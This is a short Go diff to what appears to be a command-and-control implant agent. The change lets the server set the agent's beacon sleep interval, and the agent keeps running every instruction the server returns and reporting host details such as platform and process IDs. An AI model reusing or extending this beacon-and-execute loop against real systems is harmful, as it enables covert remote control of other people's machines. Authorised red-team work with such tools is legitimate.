@@ -21,9 +21,12 @@ import (
 var iteration = 60
 
 func askForInstructions(profile map[string]interface{}) {
-	commands := api.Instructions(profile)
-	if commands != nil && len(commands.([]interface{})) > 0 {
-		cmds := reflect.ValueOf(commands)
+	beacon := api.Instructions(profile)
+	if beacon["sleep"] != nil {
+		profile["sleep"] = beacon["sleep"]
+	}
+	if beacon["instructions"] != nil && len(beacon["instructions"].([]interface{})) > 0 {
+		cmds := reflect.ValueOf(beacon["instructions"])
 		for i := 0; i < cmds.Len(); i++ {
 			cmd := cmds.Index(i).Elem().String()
 			fmt.Println("[*] Running instruction")
@@ -37,7 +40,7 @@ func askForInstructions(profile map[string]interface{}) {
 			api.Execute(profile, command)
 		}
 	} else {
-		time.Sleep(time.Duration(iteration) * time.Second)
+		time.Sleep(time.Duration(profile["sleep"].(int)) * time.Second)
 	}
 }
 
@@ -52,6 +55,7 @@ func buildProfile(server string, group string, executors []string) map[string]in
 	profile["architecture"] = runtime.GOARCH
 	profile["platform"] = runtime.GOOS
 	profile["location"] = os.Args[0]
+	profile["sleep"] = iteration
 	profile["pid"] = strconv.Itoa(os.Getpid())
 	profile["ppid"] = strconv.Itoa(os.Getppid())
 	profile["executors"] = execute.DetermineExecutor(executors, runtime.GOOS, runtime.GOARCH)
